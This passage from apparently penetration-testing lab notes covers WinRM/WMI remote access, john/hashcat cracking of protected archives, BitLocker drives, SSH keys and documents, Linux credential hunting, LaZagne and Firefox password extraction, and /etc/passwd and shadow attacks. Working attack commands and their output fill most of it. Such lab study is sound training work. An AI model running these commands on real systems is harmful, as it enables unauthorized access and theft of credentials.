can be reached via WinRM, we can easily do this with the help of PowerShell. We can use the tool called evil-winrm</p> <pre><code>secops@kali[/kali]$ evil-winrm -i 10.129.201.248 -u cryanight -p P455w0rD!\n\nEvil-WinRM shell v3.3\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\cryanight\\Documents&gt;\n</code></pre>","title":"Footprinting the Service"},{"location":"footprinting/windows_remote_management_protocol/#wmi","text":"<p>Windows Management Instrumentation (<code>WMI</code>) is Microsoft's implementation and also an extension of the Common Information Model (<code>CIM</code>), core functionality of the standardized Web-Based Enterprise Management (<code>WBEM</code>) for the Windows platform. WMI allows read and write access to almost all settings on Windows systems. Understandably, this makes it the most critical interface in the Windows environment for the administration and remote maintenance of Windows computers, regardless of whether they are PCs or servers. WMI is typically accessed via PowerShell, VBScript, or the Windows Management Instrumentation Console (<code>WMIC</code>). WMI is not a single program but consists of several programs and various databases, also known as repositories.</p>","title":"WMI"},{"location":"footprinting/windows_remote_management_protocol/#footprinting-the-service_2","text":"<p>The initialization of the WMI communication always takes place on <code>TCP</code> port <code>135</code>, and after the successful establishment of the connection, the communication is moved to a random port. For example, the program wmiexec.py from the Impacket toolkit can be used for this.</p> <pre><code>secops@kali[/kali]$ /usr/share/doc/python3-impacket/examples/wmiexec.py cryanight:\"P455w0rD!\"@10.129.201.248 \"hostname\"\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n[*] SMBv3.0 dialect used\nILF-SQL-01\n</code></pre>","title":"Footprinting the Service"},{"location":"password_attacks/cracking_files/protected_archives/","text":"Cracking ZIP <p>Using zip2john <pre><code>secops@kali[/kali]$ zip2john ZIP.zip &gt; zip.hash\n\nver 2.0 efh 5455 efh 7875 ZIP.zip/flag.txt PKZIP Encr: 2b chk, TS_chk, cmplen=42, decmplen=30, crc=490E7510\n</code></pre></p> <p>By extracting the hashes, we will also see which files are in the ZIP archive. <pre><code>secops@kali[/kali]$ cat zip.hash \n\nZIP.zip/customers.csv:$pkzip2$1*2*2*0*2a*1e*490e7510*0*42*0*2a*490e*409b*ef1e7feb7c1cf701a6ada7132e6a5c6c84c032401536faf7493df0294b0d5afc3464f14ec081cc0e18cb*$/pkzip2$:customers.csv:ZIP.zip::ZIP.zip\n</code></pre></p> <p>Once we have extracted the hash, we can now use <code>john</code> again to crack it with the desired password list. Because if <code>john</code> cracks it successfully, it will show us the corresponding password that we can use to open the ZIP archive.</p> <pre><code>secops@kali[/kali]$ john --wordlist=rockyou.txt zip.hash\n\nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nWill run 2 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n1234             (ZIP.zip/customers.csv)\n1g 0:00:00:00 DONE (2022-02-09 09:18) 100.0g/s 250600p/s 250600c/s 250600C/s 123456..1478963\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n</code></pre> <p>Viewing the Cracked Hash <pre><code>secops@kali[/kali]$ john zip.hash --show\n\nZIP.zip/customers.csv:1234:customers.csv:ZIP.zip::ZIP.zip\n\n1 password hash cracked, 0 left\n</code></pre></p>  Cracking OpenSSL Encrypted Archives <p>Listing the Files <pre><code>secops@kali[/kali]$ ls\n\nGZIP.gzip \n</code></pre></p> <p>Using the tool <code>file</code>, we can obtain information about the specified file's format.</p> <pre><code>secops@kali[/kali]$ file GZIP.gzip \n\nGZIP.gzip: openssl enc'd data with salted password\n</code></pre> <p>The following one-liner will show many errors related to the GZIP format, which we can ignore. If we have used the correct password list, as in this example, we will see that we have successfully extracted another file from the archive. <pre><code>secops@kali[/kali]$ for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2&gt;/dev/null| tar xz;done\n\ngzip: stdin: not in gzip format\ntar: Child returned status 1\ntar: Error is not recoverable: exiting now\n\ngzip: stdin: not in gzip format\ntar: Child returned status 1\ntar: Error is not recoverable: exiting now\n\n&lt;SNIP&gt;\n</code></pre></p> <p>Once the for-loop has finished, we can look in the current folder again to check if the cracking of the archive was successful. <pre><code>secops@kali[/kali]$ ls\n\ncustomers.csv  GZIP.gzip  rockyou.txt\n</code></pre></p>  Cracking BitLocker Encrypted Drives <p> Four different hashes will be extracted, which can be used with different Hashcat hash modes. For our example, we will work with the first one, which refers to the BitLocker password.</p> <pre><code>secops@kali[/kali]$ bitlocker2john -i Backup.vhd &gt; backup.hashes\nsecops@kali[/kali]$ grep \"bitlocker\\$0\" backup.hashes &gt; backup.hash\nsecops@kali[/kali]$ cat backup.hash\n\n$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e...SNIP...70696f7eab6b\n</code></pre> <pre><code>secops@kali[/kali]$ hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked\n\nhashcat (v6.1.1) starting...\n\n&lt;SNIP&gt;\n\n$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f:1234qwer\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Name........: BitLocker\nHash.Target......: $bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$10...8ec54f\nTime.Started.....: Wed Feb  9 11:46:40 2022 (1 min, 42 secs)\nTime.Estimated...: Wed Feb  9 11:48:22 2022 (0 secs)\nGuess.Base.......: File (/opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:       28 H/s (8.79ms) @ Accel:32 Loops:4096 Thr:1 Vec:8\nRecovered........: 1/1 (100.00%) Digests\nProgress.........: 2880/6163 (46.73%)\nRejected.........: 0/2880 (0.00%)\nRestore.Point....: 2816/6163 (45.69%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1044480-1048576\nCandidates.#1....: chemical -&gt; secrets\n\nStarted: Wed Feb  9 11:46:35 2022\nStopped: Wed Feb  9 11:48:23 2022\n</code></pre> <p>Viewing the Cracked Hash <pre><code>secops@kali[/kali]$ cat backup.cracked \n\n$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f:1234qwer\n</code></pre></p> <p>Once we have cracked the password, we will be able to open the encrypted drives. The easiest way to mount a BitLocker encrypted virtual drive is to transfer it to a Windows system and mount it. To do this, we only have to double-click on the virtual drive. Since it is password protected, Windows will show us an error. After mounting, we can again double-click BitLocker to prompt us for the password.</p> <p></p>","title":"Protected Archives"},{"location":"password_attacks/cracking_files/protected_files/","text":"<p>Hunting for Files</p> <pre><code>cryanight@unixclient:~$ for ext in $(echo \".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*\");do echo -e \"\\nFile extension: \" $ext; find / -name *$ext 2&gt;/dev/null | grep -v \"lib\\|fonts\\|share\\|core\" ;done\n\nFile extension:  .xls\n\nFile extension:  .xls*\n\nFile extension:  .xltx\n\nFile extension:  .csv\n/home/cryanight/Docs/client-emails.csv\n/home/cryanight/ruby-2.7.3/gems/test-unit-3.3.4/test/fixtures/header-label.csv\n/home/cryanight/ruby-2.7.3/gems/test-unit-3.3.4/test/fixtures/header.csv\n/home/cryanight/ruby-2.7.3/gems/test-unit-3.3.4/test/fixtures/no-header.csv\n/home/cryanight/ruby-2.7.3/gems/test-unit-3.3.4/test/fixtures/plus.csv\n/home/cryanight/ruby-2.7.3/test/win32ole/orig_data.csv\n\nFile extension:  .od*\n/home/cryanight/Docs/document-temp.odt\n/home/cryanight/Docs/product-improvements.odp\n/home/cryanight/Docs/mgmt-spreadsheet.ods\n...SNIP...\n</code></pre> <p>Hunting for SSH Keys <pre><code>cryanight@unixclient:~$ grep -rnw \"PRIVATE KEY\" /* 2&gt;/dev/null | grep \":1\"\n\n/home/cryanight/.ssh/internal_db:1:-----BEGIN OPENSSH PRIVATE KEY-----\n/home/cryanight/.ssh/SSH.private:1:-----BEGIN OPENSSH PRIVATE KEY-----\n/home/cryanight/Mgmt/ceil.key:1:-----BEGIN OPENSSH PRIVATE KEY-----\n</code></pre></p>  Cracking with John <p>John Hashing Scripts <pre><code>secops@kali[/kali]$ locate *2john*\n\n/usr/bin/bitlocker2john\n/usr/bin/dmg2john\n/usr/bin/gpg2john\n/usr/bin/hccap2john\n/usr/bin/keepass2john\n/usr/bin/putty2john\n/usr/bin/racf2john\n/usr/bin/rar2john\n/usr/bin/uaf2john\n/usr/bin/vncpcap2john\n/usr/bin/wlanhcx2john\n/usr/bin/wpapcap2john\n/usr/bin/zip2john\n/usr/share/john/1password2john.py\n/usr/share/john/7z2john.pl\n/usr/share/john/DPAPImk2john.py\n/usr/share/john/adxcsouf2john.py\n/usr/share/john/aem2john.py\n/usr/share/john/aix2john.pl\n/usr/share/john/aix2john.py\n/usr/share/john/andotp2john.py\n/usr/share/john/androidbackup2john.py\n...SNIP...\n</code></pre></p> <pre><code>secops@kali[/kali]$ ssh2john.py SSH.private &gt; ssh.hash\nsecops@kali[/kali]$ cat ssh.hash \n\nssh.private:$sshng$0$8$1C258238FD2D6EB0$2352$f7b...SNIP...\n</code></pre> <p>Cracking SSH Keys <pre><code>secops@kali[/kali]$ john --wordlist=rockyou.txt ssh.hash\n\nUsing default input encoding: UTF-8\nLoaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes\nCost 2 (iteration count) is 1 for all loaded hashes\nWill run 2 OpenMP threads\nNote: This format may emit false positives, so it will keep trying even after\nfinding a possible candidate.\nPress 'q' or Ctrl-C to abort, almost any other key for status\n1234         (SSH.private)\n1g 0:00:00:00 DONE (2022-02-08 03:03) 16.66g/s 1747Kp/s 1747Kc/s 1747KC/s Knightsing..Babying\nSession completed\n</code></pre></p> <pre><code>secops@kali[/kali]$ john ssh.hash --show\n\nSSH.private:1234\n\n1 password hash cracked, 0 left\n</code></pre>  Cracking Documents <p>Cracking Microsoft Office Documents <pre><code>secops@kali[/kali]$ office2john.py Protected.docx &gt; protected-docx.hash\nsecops@kali[/kali]$ cat protected-docx.hash\n\nProtected.docx:$office$*2007*20*128*16*7240...SNIP...8a69cf1*98242f4da37d916305d8e2821360773b7edc481b\n</code></pre></p> <pre><code>secops@kali[/kali]$ john --wordlist=rockyou.txt protected-docx.hash\n\nLoaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])\nCost 1 (MS Office version) is 2007 for all loaded hashes\nCost 2 (iteration count) is 50000 for all loaded hashes\nWill run 2 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n1234             (Protected.docx)\n1g 0:00:00:00 DONE (2022-02-08 01:25) 2.083g/s 2266p/s 2266c/s 2266C/s trisha..heart\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n</code></pre> <pre><code>secops@kali[/kali]$ john protected-docx.hash --show\n\nProtected.docx:1234\n</code></pre> <p>Cracking PDFs <pre><code>secops@kali[/kali]$ pdf2john.py PDF.pdf &gt; pdf.hash\nsecops@kali[/kali]$ cat pdf.hash \n\nPDF.pdf:$pdf$2*3*128*-1028*1*16*7e88...SNIP...bd2*32*a72092...SNIP...0000*32*c48f001fdc79a030d718df5dbbdaad81d1f6fedec4a7b5cd980d64139edfcb7e\n</code></pre></p> <pre><code>secops@kali[/kali]$ john --wordlist=rockyou.txt pdf.hash\n\nUsing default input encoding: UTF-8\nLoaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])\nCost 1 (revision) is 3 for all loaded hashes\nWill run 2 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n1234             (PDF.pdf)\n1g 0:00:00:00 DONE (2022-02-08 02:16) 25.00g/s 27200p/s 27200c/s 27200C/s bulldogs..heart\nUse the \"--show --format=PDF\" options to display all of the cracked passwords reliably\nSession completed\n</code></pre> <pre><code>secops@kali[/kali]$ john pdf.hash --show\n\nPDF.pdf:1234\n\n1 password hash cracked, 0 left\n</code></pre>","title":"Protected Files"},{"location":"password_attacks/linux_local_password_attacks/credential_hunting/","text":"<p>Configuration Files</p> <pre><code>cryanight@unixclient:~$ for l in $(echo \".conf .config .cnf\");do echo -e \"\\nFile extension: \" $l; find / -name *$l 2&gt;/dev/null | grep -v \"lib\\|fonts\\|share\\|core\" ;done\n\nFile extension:  .conf\n/run/tmpfiles.d/static-nodes.conf\n/run/NetworkManager/resolv.conf\n/run/NetworkManager/no-stub-resolv.conf\n/run/NetworkManager/conf.d/10-globally-managed-devices.conf\n...SNIP...\n/etc/ltrace.conf\n/etc/rygel.conf\n/etc/ld.so.conf.d/x86_64-linux-gnu.conf\n/etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf\n/etc/fprintd.conf\n\nFile extension:  .config\n/usr/src/linux-headers-5.13.0-27-generic/.config\n/usr/src/linux-headers-5.11.0-27-generic/.config\n/usr/src/linux-hwe-5.13-headers-5.13.0-27/tools/perf/Makefile.config\n/usr/src/linux-hwe-5.13-headers-5.13.0-27/tools/power/acpi/Makefile.config\n/usr/src/linux-hwe-5.11-headers-5.11.0-27/tools/perf/Makefile.config\n/usr/src/linux-hwe-5.11-headers-5.11.0-27/tools/power/acpi/Makefile.config\n/home/cryanight/.config\n/etc/X11/Xwrapper.config\n/etc/manpath.config\n\nFile extension:  .cnf\n/etc/ssl/openssl.cnf\n/etc/alternatives/my.cnf\n/etc/mysql/my.cnf\n/etc/mysql/debian.cnf\n/etc/mysql/mysql.conf.d/mysqld.cnf\n/etc/mysql/mysql.conf.d/mysql.cnf\n/etc/mysql/mysql.cnf\n/etc/mysql/conf.d/mysqldump.cnf\n/etc/mysql/conf.d/mysql.cnf\n</code></pre> <p>Credentials in Configuration Files <pre><code>cryanight@unixclient:~$ for i in $(find / -name *.cnf 2&gt;/dev/null | grep -v \"doc\\|lib\");do echo -e \"\\nFile: \" $i; grep \"user\\|password\\|pass\" $i 2&gt;/dev/null | grep -v \"\\#\";done\n\nFile:  /snap/core18/2128/etc/ssl/openssl.cnf\nchallengePassword       = A challenge password\n\nFile:  /usr/share/ssl-cert/ssleay.cnf\n\nFile:  /etc/ssl/openssl.cnf\nchallengePassword       = A challenge password\n\nFile:  /etc/alternatives/my.cnf\n\nFile:  /etc/mysql/my.cnf\n\nFile:  /etc/mysql/debian.cnf\n\nFile:  /etc/mysql/mysql.conf.d/mysqld.cnf\nuser        = mysql\n\nFile:  /etc/mysql/mysql.conf.d/mysql.cnf\n\nFile:  /etc/mysql/mysql.cnf\n\nFile:  /etc/mysql/conf.d/mysqldump.cnf\n\nFile:  /etc/mysql/conf.d/mysql.cnf\n</code></pre></p> <p>Databases <pre><code>cryanight@unixclient:~$ for l in $(echo \".sql .db .*db .db*\");do echo -e \"\\nDB File extension: \" $l; find / -name *$l 2&gt;/dev/null | grep -v \"doc\\|lib\\|headers\\|share\\|man\";done\n\nDB File extension:  .sql\n\nDB File extension:  .db\n/var/cache/dictionaries-common/ispell.db\n/var/cache/dictionaries-common/aspell.db\n/var/cache/dictionaries-common/wordlist.db\n/var/cache/dictionaries-common/hunspell.db\n/home/cryanight/.mozilla/firefox/1bplpd86.default-release/cert9.db\n/home/cryanight/.mozilla/firefox/1bplpd86.default-release/key4.db\n/home/cryanight/.cache/tracker/meta.db\n\nDB File extension:  .*db\n/var/cache/dictionaries-common/ispell.db\n/var/cache/dictionaries-common/aspell.db\n/var/cache/dictionaries-common/wordlist.db\n/var/cache/dictionaries-common/hunspell.db\n/home/cryanight/.mozilla/firefox/1bplpd86.default-release/cert9.db\n/home/cryanight/.mozilla/firefox/1bplpd86.default-release/key4.db\n/home/cryanight/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-card-database.tdb\n/home/cryanight/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-device-volumes.tdb\n/home/cryanight/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-stream-volumes.tdb\n/home/cryanight/.cache/tracker/meta.db\n/home/cryanight/.cache/tracker/ontologies.gvdb\n\nDB File extension:  .db*\n/var/cache/dictionaries-common/ispell.db\n/var/cache/dictionaries-common/aspell.db\n/var/cache/dictionaries-common/wordlist.db\n/var/cache/dictionaries-common/hunspell.db\n/home/cryanight/.dbus\n/home/cryanight/.mozilla/firefox/1bplpd86.default-release/cert9.db\n/home/cryanight/.mozilla/firefox/1bplpd86.default-release/key4.db\n/home/cryanight/.cache/tracker/meta.db-shm\n/home/cryanight/.cache/tracker/meta.db-wal\n/home/cryanight/.cache/tracker/meta.db\n</code></pre></p> <p>Notes <pre><code>cryanight@unixclient:~$ find /home/* -type f -name \"*.txt\" -o ! -name \"*.*\"\n\n/home/cryanight/.config/caja/desktop-metadata\n/home/cryanight/.config/clipit/clipitrc\n/home/cryanight/.config/dconf/user\n/home/cryanight/.mozilla/firefox/bh4w5vd0.default-esr/pkcs11.txt\n/home/cryanight/.mozilla/firefox/bh4w5vd0.default-esr/serviceworker.txt\n...SNIP...\n</code></pre></p> Scripts <pre><code>cryanight@unixclient:~$ for l in $(echo \".py .pyc .pl .go .jar .c .sh\");do echo -e \"\\nFile extension: \" $l; find / -name *$l 2&gt;/dev/null | grep -v \"doc\\|lib\\|headers\\|share\";done\n\nFile extension:  .py\n\nFile extension:  .pyc\n\nFile extension:  .pl\n\nFile extension:  .go\n\nFile extension:  .jar\n\nFile extension:  .c\n\nFile extension:  .sh\n/snap/gnome-3-34-1804/72/etc/profile.d/vte-2.91.sh\n/snap/gnome-3-34-1804/72/usr/bin/gettext.sh\n/snap/core18/2128/etc/init.d/hwclock.sh\n/snap/core18/2128/etc/wpa_supplicant/action_wpa.sh\n/snap/core18/2128/etc/wpa_supplicant/functions.sh\n...SNIP...\n/etc/profile.d/xdg_dirs_desktop_session.sh\n/etc/profile.d/cedilla-portuguese.sh\n/etc/profile.d/im-config_wayland.sh\n/etc/profile.d/vte-2.91.sh\n/etc/profile.d/bash_completion.sh\n/etc/profile.d/apps-bin-path.sh\n</code></pre> Cronjobs <pre><code>cryanight@unixclient:~$ cat /etc/crontab \n\n# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# Example of job definition:\n# .---------------- minute (0 - 59)\n# |  .------------- hour (0 - 23)\n# |  |  .---------- day of month (1 - 31)\n# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...\n# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat\n# |  |  |  |  |\n# *  *  *  *  * user-name command to be executed\n17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly\n</code></pre> <pre><code>cryanight@unixclient:~$ ls -la /etc/cron.*/\n\n/etc/cron.d/:\ntotal 28\ndrwxr-xr-x 1 root root  106  3. Jan 20:27 .\ndrwxr-xr-x 1 root root 5728  1. Feb 00:06 ..\n-rw-r--r-- 1 root root  201  1. M\u00e4r 2021  e2scrub_all\n-rw-r--r-- 1 root root  331  9. Jan 2021  geoipupdate\n-rw-r--r-- 1 root root  607 25. Jan 2021  john\n-rw-r--r-- 1 root root  589 14. Sep 2020  mdadm\n-rw-r--r-- 1 root root  712 11. Mai 2020  php\n-rw-r--r-- 1 root root  102 22. Feb 2021  .placeholder\n-rw-r--r-- 1 root root  396  2. Feb 2021  sysstat\n\n/etc/cron.daily/:\ntotal 68\ndrwxr-xr-x 1 root root  252  6. Jan 16:24 .\ndrwxr-xr-x 1 root root 5728  1. Feb 00:06 ..\n</code></pre>  SSH Keys <p>SSH Private Keys <pre><code>cryanight@unixclient:~$ grep -rnw \"PRIVATE KEY\" /home/* 2&gt;/dev/null | grep \":1\"\n\n/home/cryanight/.ssh/internal_db:1:-----BEGIN OPENSSH PRIVATE KEY-----\n</code></pre></p> <p>SSH Public Keys <pre><code>cryanight@unixclient:~$ grep -rnw \"ssh-rsa\" /home/* 2&gt;/dev/null | grep \":1\"\n\n/home/cryanight/.ssh/internal_db.pub:1:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCraK\n</code></pre></p>  History <p>Bash History <pre><code>cryanight@unixclient:~$ tail -n5 /home/*/.bash*\n\n==&gt; /home/cryanight/.bash_history &lt;==\nvim ~/testing.txt\nvim ~/testing.txt\nchmod 755 /tmp/api.py\nsu\n/tmp/api.py cryanight 6mX4UP1eWH3HXK\n\n==&gt; /home/cryanight/.bashrc &lt;==\n    . /usr/share/bash-completion/bash_completion\n  elif [ -f /etc/bash_completion ]; then\n    . /etc/bash_completion\n  fi\nfi\n</code></pre></p>  Logs <pre><code>cryanight@unixclient:~$ for i in $(ls /var/log/* 2&gt;/dev/null);do GREP=$(grep \"accepted\\|session opened\\|session closed\\|failure\\|failed\\|ssh\\|password changed\\|new user\\|delete user\\|sudo\\|COMMAND\\=\\|logs\" $i 2&gt;/dev/null); if [[ $GREP ]];then echo -e \"\\n#### Log file: \" $i; grep \"accepted\\|session opened\\|session closed\\|failure\\|failed\\|ssh\\|password changed\\|new user\\|delete user\\|sudo\\|COMMAND\\=\\|logs\" $i 2&gt;/dev/null;fi;done\n\n#### Log file:  /var/log/dpkg.log.1\n2022-01-10 17:57:41 install libssh-dev:amd64 &lt;none&gt; 0.9.5-1+deb11u1\n2022-01-10 17:57:41 status half-installed libssh-dev:amd64 0.9.5-1+deb11u1\n2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 \n2022-01-10 17:57:41 configure libssh-dev:amd64 0.9.5-1+deb11u1 &lt;none&gt; \n2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 \n2022-01-10 17:57:41 status half-configured libssh-dev:amd64 0.9.5-1+deb11u1\n2022-01-10 17:57:41 status installed libssh-dev:amd64 0.9.5-1+deb11u1\n\n...SNIP...\n</code></pre>  Memory and Cache <p>Memory - LaZagne <pre><code>cryanight@unixclient:~$ sudo python2.7 laZagne.py all\n\n|====================================================================|\n|                                                                    |\n|                        The LaZagne Project                         |\n|                                                                    |\n|                          ! BANG BANG !                             |\n|                                                                    |\n|====================================================================|\n\n------------------- Shadow passwords -----------------\n\n[+] Hash found !!!\nLogin: systemd-coredump\nHash: !!:18858::::::\n\n[+] Hash found !!!\nLogin: sambauser\nHash: $6$wgK4tGq7Jepa.V0g$QkxvseL.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs7x/fhI.8negiUSPqaWyv7wC8uwsWPrx1:18862:0:99999:7:::\n\n[+] Password found !!!\nLogin: cryanight\nPassword: WLpAEXFa0SbqOHY\n\n\n[+] 3 passwords have been found.\nFor more information launch it again with the -v option\n\nelapsed time = 3.50091600418\n</code></pre></p> <p>Firefox Stored Credentials <pre><code>cryanight@unixclient:~$ ls -l .mozilla/firefox/ | grep default \n\ndrwx------ 11 cryanight cryanight 4096 Jan 28 16:02 1bplpd86.default-release\ndrwx------  2 cryanight cryanight 4096 Jan 28 13:30 lfx3lvhb.default\n</code></pre></p> <pre><code>cryanight@unixclient:~$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .\n\n{\n  \"nextId\": 2,\n  \"logins\": [\n    {\n      \"id\": 1,\n      \"hostname\": \"https://www.LEGALCORP.com\",\n      \"httpRealm\": null,\n      \"formSubmitURL\": \"https://www.LEGALCORP.com\",\n      \"usernameField\": \"username\",\n      \"passwordField\": \"password\",\n      \"encryptedUsername\": \"MDoEEPgAAAA...SNIP...1liQiqBBAG/8/UpqwNlEPScm0uecyr\",\n      \"encryptedPassword\": \"MEIEEPgAAAA...SNIP...FrESc4A3OOBBiyS2HR98xsmlrMCRcX2T9Pm14PMp3bpmE=\",\n      \"guid\": \"{412629aa-4113-4ff9-befe-dd9b4ca388e2}\",\n      \"encType\": 1,\n      \"timeCreated\": 1643373110869,\n      \"timeLastUsed\": 1643373110869,\n      \"timePasswordChanged\": 1643373110869,\n      \"timesUsed\": 1\n    }\n  ],\n  \"potentiallyVulnerablePasswords\": [],\n  \"dismissedBreachAlertsByLoginGUID\": {},\n  \"version\": 3\n}\n</code></pre> <p>The tool Firefox Decrypt is excellent for decrypting these credentials, and is updated regularly. It requires Python 3.9 to run the latest version. Otherwise, <code>Firefox Decrypt 0.7.0</code> with Python 2 must be used.</p> <pre><code>secops@kali[/kali]$ python3.9 firefox_decrypt.py\n\nSelect the Mozilla profile you wish to decrypt\n1 -&gt; lfx3lvhb.default\n2 -&gt; 1bplpd86.default-release\n\n2\n\nWebsite:   https://testing.dev.LEGALCORP.com\nUsername: 'test'\nPassword: 'test'\n\nWebsite:   https://www.LEGALCORP.com\nUsername: 'cryanight'\nPassword: 'FzXUxJemKm6g2lGh'\n</code></pre> <p>Alternatively, <code>LaZagne</code>: <pre><code>cryanight@unixclient:~$ python3 laZagne.py browsers\n\n|====================================================================|\n|                                                                    |\n|                        The LaZagne Project                         |\n|                                                                    |\n|                          ! BANG BANG !                             |\n|                                                                    |\n|====================================================================|\n\n------------------- Firefox passwords -----------------\n\n[+] Password found !!!\nURL: https://testing.dev.LEGALCORP.com\nLogin: test\nPassword: test\n\n[+] Password found !!!\nURL: https://www.LEGALCORP.com\nLogin: cryanight\nPassword: FzXUxJemKm6g2lGh\n\n\n[+] 2 passwords have been found.\nFor more information launch it again with the -v option\n\nelapsed time = 0.2310788631439209\n</code></pre></p>","title":"Credential Hunting"},{"location":"password_attacks/linux_local_password_attacks/passwd_shadow_opasswd/","text":"Passwd Format    <code>cryanight</code> <code>:</code> <code>x</code> <code>:</code> <code>1000</code> <code>:</code> <code>1000</code> <code>:</code> <code>cryanight,,,</code> <code>:</code> <code>/home/cryanight</code> <code>:</code> <code>/bin/bash</code>     Login name  Password info  UID  GUID  Full name/comments  Home directory  Shell    <p>Usually, we find the value <code>x</code> in this field, which means that the passwords are stored in an encrypted form in the <code>/etc/shadow</code> file. However, it can also be that the <code>/etc/passwd</code> file is writeable by mistake. This would allow us to clear this field for the user <code>root</code> so that the password info field is empty. This will cause the system not to send a password prompt when a user tries to log in as <code>root</code>.</p> <p>Editing /etc/passwd - Before <pre><code>root:x:0:0:root:/root:/bin/bash\n</code></pre></p> <p>Editing /etc/passwd - After <pre><code>root::0:0:root:/root:/bin/bash\n</code></pre></p>  Shadow File    <code>cryanight</code> <code>:</code> <code>$6$wBRzy$...SNIP...x9cDWUxW1</code> <code>:</code> <code>18937</code> <code>:</code> <code>0</code> <code>:</code> <code>99999</code> <code>:</code> <code>7</code> <code>:</code> <code>:</code> <code>:</code>     Username  Encrypted password  Last PW change  Min. PW age  Max. PW age  Warning period Inactivity period Expiration date Unused    <p>Shadow File <pre><code>[cryanight@parrot]\u2500[~]$ sudo cat /etc/shadow\n\nroot:*:18747:0:99999:7:::\nsys:!:18747:0:99999:7:::\n...SNIP...\ncryanight:$6$wBRzy$...SNIP...x9cDWUxW1:18937:0:99999:7:::\n</code></pre></p> <p>Ff the <code>encrypted password</code> field is empty. This means that no password is required for the login. Algorithm Types</p> <ul> <li> <code>$1$</code> \u2013 MD5</li> <li> <code>$2a$</code> \u2013 Blowfish</li> <li> <code>$2y$</code> \u2013 Eksblowfish</li> <li> <code>$5$</code> \u2013 SHA-256</li> <li> <code>$6$</code> \u2013 SHA-512</li> </ul>  Opasswd <p>The PAM library (<code>pam_unix.so</code>) can prevent reusing old passwords. The file where old passwords are stored is the <code>/etc/security/opasswd</code>. Administrator/root permissions are also required to read the file if the permissions for this file have not been changed manually.</p> <p>Reading /etc/security/opasswd <pre><code>secops@kali[/kali]$ sudo cat /etc/security/opasswd\n\ncryanight:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1\n</code></pre></p>  Cracking Linux Credentials <p>Once we have collected some hashes, we can try to crack them in different ways to get the passwords in cleartext. <pre><code>secops@kali[/kali]$ sudo cp /etc/passwd /tmp/passwd.bak \nsecops@kali[/kali]$ sudo cp /etc/shadow /tmp/shadow.bak \nsecops@kali[/kali]$ unshadow /tmp/passwd.bak /tmp/shadow.bak &gt; /tmp/unshadowed.hashes\n</code></pre></p> <p>Hashcat - Cracking Unshadowed Hashes <pre><code>secops@kali[/kali]$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked\n</code></pre></p> <p>Hashcat - Cracking MD5 Hashes <pre><code>secops@kali[/kali]$ cat md5-hashes.list\n\nqNDkF0zJ3v8ylCOrKB0kt0\nE9uMSmiQeRh4pAAgzuvkq1\n</code></pre></p> <pre><code>secops@kali[/kali]$ hashcat -m 500 -a 0 md5-hashes.list rockyou.txt\n</code></pre>","title":"Passwd, Shadow, Opasswd"},{"location":"password_attacks/remote_password_attacks/network_services/","text":"WinRM <p>CrackMapExec Usage <pre><code>secops@kali[/kali]$ crackmapexec winrm 